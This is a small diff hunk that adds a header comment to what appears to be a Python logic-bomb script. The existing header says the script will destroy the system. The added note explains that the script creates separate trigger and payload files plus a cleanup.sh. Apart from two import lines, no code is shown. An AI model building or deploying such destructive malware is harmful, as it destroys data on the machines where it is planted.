@@ -15,6 +15,15 @@
 #      This script will destroy you system.
 #
 # ====================================================================
+# ====================================================================
+#
+#                    Note
+#      This isn't a traditional logic bomb
+#      This code will create separate trigger and payloads
+#      These trigger and payload files will act as the logic bomb
+#      A cleanup.sh file will also be created to clean up the system
+#
+# ====================================================================
 
 from platform import system as psystem
 from os import path as opath, system as osystem
